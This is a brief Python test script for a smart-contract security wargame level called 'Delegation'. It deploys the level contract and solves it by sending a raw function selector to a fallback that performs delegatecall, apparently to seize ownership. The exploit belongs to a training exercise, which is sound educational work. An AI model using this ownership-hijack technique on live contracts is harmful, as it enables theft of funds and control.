from wake.testing import *
from tests.level_service import LevelService
from pytypes.contracts.i06_delegation import Delegate, Delegation


@default_chain.connect()
def test_level_06():
    service = LevelService(default_chain)
    contract = service.deploy_level_06()
    do_level_06_solution(contract)
    service.check_level_06(contract)

def do_level_06_solution(contract: Delegation):
    # Training: delegatecall, fallback(), invoking function by function selector 
    contract.transact(b"\xdd\x36\x5b\x8b")
